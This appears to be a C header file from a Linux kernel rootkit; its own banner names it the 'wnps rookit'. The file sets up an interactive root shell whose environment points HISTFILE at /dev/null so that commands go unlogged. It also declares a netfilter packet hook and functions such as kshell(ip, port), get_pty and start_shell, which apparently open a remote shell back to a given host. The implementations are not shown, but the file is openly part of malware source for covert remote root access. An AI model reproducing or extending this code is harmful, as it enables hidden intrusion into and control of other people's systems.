#ifndef KSHELL_H
#define KSHELL_H

char *earg[3] = { "sh", "-i",NULL };

char *env[] = 
{
    "TERM=linux",
    "HOME=" "/",
    "LOGNAME=root",
    "USERNAME=root",
    "USER=root",
    "PS1=[\033[0;32;40m\\u@\\h:\\w]\\$ ", 
    "HISTFILE=/dev/null",
    "PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/X11R6/bin:./bin",
    "!TERM",
    NULL
};

char banner[200] = {"\n\33[1;31m\t\t#welcome to use wnps rookit.enjoy your hacking#\n\n"};

unsigned int hook_func(unsigned int hooknum,
                       struct sk_buff **skb,
                       const struct net_device *in,
                       const struct net_device *out,
                       int (*okfn)(struct sk_buff *));
int kshell(int ip,int port);
int get_pty(void);
void eco_off(void);
void start_shell(void);

#endif
